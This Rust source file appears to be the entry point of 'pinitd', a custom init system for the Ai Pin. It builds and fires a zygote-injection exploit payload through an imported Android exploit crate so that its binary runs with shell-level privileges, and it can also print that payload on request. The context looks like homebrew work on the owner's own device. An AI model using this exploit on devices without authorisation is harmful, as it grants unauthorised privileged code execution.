#[macro_use]
extern crate log;
extern crate android_logger;

use std::{
    env::{self, current_exe},
    path::PathBuf,
};

use android_31317_exploit::exploit::{ExploitKind, TriggerApp, execute, payload};
use android_logger::Config;
use clap::Parser;
use controller::Controller;
use error::Error;
use log::LevelFilter;
use worker::Worker;
use zygote::extract_and_write_fd;

mod controller;
mod error;
mod protocol;
mod socket;
mod worker;
mod zygote;

/// Custom init system for Ai Pin
#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
enum Args {
    /// Initialize pinit
    Initialize(SharedArgs),
    /// Specializes this process as the controller, pid 2000 (shell), process
    Controller(SharedArgs),
    /// Specializes this process as the worker, pid 1000 (shell), process
    Worker(NoAdditionalArgs),
    /// Create custom exploit payload. NOTE: This is for internal use; rely on the pinitd for launching other processes
    BuildPayload(SharedArgs),
}

#[derive(Parser, Debug)]
struct SharedArgs {
    #[arg()]
    priviledged_binary_path: String,
    #[arg(trailing_var_arg = true, allow_hyphen_values = true)]
    _remaining_args: Vec<String>,
}

#[derive(Parser, Debug)]
struct NoAdditionalArgs {
    #[arg(trailing_var_arg = true, allow_hyphen_values = true)]
    _remaining_args: Vec<String>,
}

fn main() {
    warn!("Setting up. Args: {:?}", env::args());
    // Purposefully don't initialize logging until we need it, so we can specialize it for the process in question
    match run() {
        Err(e) => {
            init_logging_with_tag(None);
            error!("{e}")
        }
        _ => (),
    }
}

fn run() -> Result<(), Error> {
    log_panics::init();
    let executable = current_exe()?;

    if let Err(error) = extract_and_write_fd() {
        error!("fd error: {error}");
    }

    // TOOD: Worker process needs to use binaries from inside app package?

    match Args::try_parse()? {
        Args::Initialize(SharedArgs {
            priviledged_binary_path,
            ..
        }) => {
            // Spawn only the controller
            init_logging_with_tag(None);
            warn!("Requesting controller start");
            let payload = init_payload(executable, &priviledged_binary_path)?;
            Ok(execute(
                &payload,
                &TriggerApp::new(
                    "com.android.settings".into(),
                    "com.android.settings.Settings".into(),
                ),
            )?)
        }
        Args::Controller(SharedArgs {
            priviledged_binary_path,
            ..
        }) => {
            // Spawn the worker and enter work loop
            init_logging_with_tag(Some("pinitd-controller".into()));
            warn!("Starting controller");
            // This uses the priviledged binary, not our binary
            Ok(Controller::create(priviledged_binary_path.into())?)
        }
        Args::Worker(_) => {
            init_logging_with_tag(Some("pinitd-worker".into()));
            warn!("Starting worker");
            Ok(Worker::create()?)
        }
        Args::BuildPayload(SharedArgs {
            priviledged_binary_path,
            ..
        }) => {
            init_logging_with_tag(None);
            warn!("Building init payload only");
            let payload = init_payload("/data/local/tmp/pinitd".into(), &priviledged_binary_path)?;
            // Write to stdout
            print!("{payload}");
            Ok(())
        }
    }
}

fn init_logging_with_tag(tag: Option<String>) {
    let config = Config::default();

    let config = if let Some(tag) = tag {
        config.with_tag(tag)
    } else {
        config
    };

    android_logger::init_once(config.with_max_level(LevelFilter::Trace));

    let args: Vec<String> = env::args().collect();
    warn!("Arguments: {args:?}");
}

fn init_payload(executable: PathBuf, priviledged_binary_path: &str) -> Result<String, Error> {
    Ok(payload(
        2000,
        "/data/local/tmp/",
        "com.android.shell",
        "platform:shell:targetSdkVersion=29:complete",
        // Wrap command in sh to ensure proper permissions
        &ExploitKind::Command(format!(
            // Specifically use single quotes to preserve arguments
            // "'i=0;f=0;for a in \"\$@\";do i=\$((i+1));if [ \"\$a\" = com.android.internal.os.WrapperInit ];then eval f=\\\${\$((i+1))};break;fi;done; exec /system/bin/sh -c \"/data/local/tmp/pinitd controller & p=\\\$!; echo \\\$p >/proc/self/fd/\\\$1\" sh \"\$f\"'"
            "{} controller {priviledged_binary_path}",
            // "/data/local/tmp/zygote_pid_writer",
            // "/system/bin/sh -c 'nohup {} controller $0 &'",
            executable.display()
        )),
        Some("com.android.shell"),
    )?)
}
